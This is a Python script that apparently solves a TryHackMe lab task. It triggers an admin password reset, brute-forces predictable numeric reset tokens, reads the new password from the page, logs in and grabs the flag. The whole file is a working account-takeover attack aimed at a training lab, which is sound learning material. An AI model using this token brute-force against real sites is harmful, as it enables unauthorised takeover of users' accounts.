#!/usr/bin/env python3
#
# Script designed to automate the exploitation and
# flag retrieval for Task 4 of TryHackMe's
# "Enumeration  & Brute Force" room.
#
# This is designed to show an alternate way to exploit
# the vulnerability showcased in this task. Instead of
# using BurpSuite's Intruder module, this script will
# carry out all necessary steps to reset the admin password
# and acquire the flag.
#
# To Call:
#
#   python3 task4.py enum.thm/labs/predictable_tokens
#

import argparse
import os
import platform
import re
import requests

class Resetter:
    def __init__(self, baseurl, min_num=None, max_num=None):
        """
        function designed to initialize and instance of
        the Resetter class.

        if no min_num is specified, the default is 100.

        if no max_num is specified, the default is 200.

        note: the baseurl should be in the form "enum.thm/labs/predictable_tokens"
        and should not include any ".php" file. this is the base url
        for the site.
        """
        if not(isinstance(baseurl,str)):
            raise TypeError(f"baseurl must be a str. got {type(baseurl)}")

        baseurl = baseurl.strip()
        if baseurl[-1] == "/":
            baseurl = baseurl[:-1]

        if len(baseurl) < 1:
            raise ValueError("baseurl cannot be an empty string")

        if min_num is None:
            min_num = 100
        elif not(isinstance(min_num,int)):
            raise TypeError(f"min_num must be an int. got {type(min_num)}")
        elif min_num < 1:
            raise ValueError("min_num must be at least 1")

        if max_num is None:
            max_num = 200
        elif not(isinstance(max_num,int)):
            raise TypeError(f"max_num must be an int. got {type(max_num)}")

        self.__baseurl = baseurl
        self.__email = "admin@admin.com"
        self.__min_num = min_num
        self.__max_num = max_num
        self.__session = requests.Session()
        self.__timeout = 10
        return

    def __get_flag(self):
        """
        function designed to navigate to the dashboard after
        login and get the flag.
        """
        err = None
        flag_pat = "thm{.*}"
        flag_val = str()
        target = f"{self.__baseurl}/dashboard.php"

        try:
            resp = self.__session.get(target, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"bad status code ({resp.status_code} {resp.reason})")

            flag_val, success, message = FindFlag(resp.text, flag_pat)
            if not(success):
                raise ValueError(message)
        except Exception as ex:
            err = ex

        return (flag_val, err)

    def __login(self, new_password):
        """
        function designed to login to the application
        using the password acquired from the reset attack.
        """
        err = None
        target = f"{self.__baseurl}/functions.php"

        try:
            payload = {"username": self.__email, "password": new_password, "function": "login"}
            resp = self.__session.post(target, data=payload, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"bad status code ({resp.status_code} {resp.reason})")

            status = resp.json().get("status")
            if status.lower() != "success":
                raise ValueError(resp.json().get("message"))            
        except Exception as ex:
            err = ex

        return err


    def __make_request(self, test_num):
        """
        function designed to make a request to the reset
        endpoint and return the text. this text will
        be used to determine if the token value is valid or not.
        """
        body_txt = str()
        err = None
        target = f"{self.__baseurl}/reset_password.php"

        try:
            if not(isinstance(test_num,int)):
                raise TypeError(f"test_num must be an int. got {type(test_num)}")

            payload = {"token": test_num}

            resp = self.__session.get(target, params=payload, timeout=self.__timeout)
            body_txt = resp.text
        except Exception as ex:
            err = ex

        return (body_txt,err)

    def __reset_password(self):
        """
        function designed to POST a password reset request.
        this is required prior to enumeration.
        """
        err = None
        target = f"{self.__baseurl}/forgot.php"

        try:
            payload = {"email": self.__email}
            resp = self.__session.post(target, data=payload)
            if resp.status_code >= 400:
                raise ValueError(f"bad status code ({resp.status_code} {resp.reason})")
        except Exception as ex:
            err = ex

        return err

    def attack(self):
        bad_msg = "invalid token"
        base_len = 0
        base_num = 999
        cur_len = 0
        err = None
        flag_val = str()
        pass_pat = "Your\\snew\\spassword\\sis:\\s([a-zA-Z0-9]+)"
        token_found = bool()
        valid_text = str()

        try:
            err = self.__reset_password()
            if err:
                raise err
            SucMsg("reset request sent")

            for cur_token in range(self.__min_num, self.__max_num+1):
                SysMsgNB(f"testing token \"{cur_token}\"")
                cur_txt, err = self.__make_request(cur_token)
                if err or (bad_msg in cur_txt.lower()):
                    continue
                token_found = True
                valid_text = cur_txt
                break

            if not(token_found):
                raise ValueError(f"no valid token found between {self.__min_num} and {self.__max_num}")

            new_pass, success, message = FindFlag(valid_text, pass_pat)
            if not(success):
                raise ValueError(message)
            SucMsg(f"password: {new_pass}")

            err = self.__login(new_pass)
            if err:
                raise err

            flag_val, err = self.__get_flag()
            if err:
                raise err
        except Exception as ex:
            err = ex

        return (flag_val, err)



############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_GRN}[+]{ANSI_RST} {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_RED}[-]{ANSI_RST} {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}", end="")
    return

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)

    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    secure = args.secure

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseurl = f"{scheme}://{target}"

    try:
        tester = Resetter(baseurl)
        flag_val, err = tester.attack()
        if err:
            raise err
        SucMsg(f"Flag: {flag_val}")
    except Exception as ex:
        ErrMsg(str(ex))

    return

if __name__ == "__main__":
    main()
